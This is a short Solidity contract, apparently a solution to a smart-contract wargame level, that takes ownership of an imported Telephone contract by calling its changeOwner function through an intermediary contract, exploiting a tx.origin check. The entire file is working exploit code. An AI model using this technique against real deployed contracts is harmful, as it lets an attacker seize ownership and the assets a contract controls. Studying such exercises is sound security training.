// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./telephone.sol";


contract AttackTelephone {
    Telephone public telephoneContract;

    constructor(address telephoneContractAddress) {
        telephoneContract = Telephone(telephoneContractAddress);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}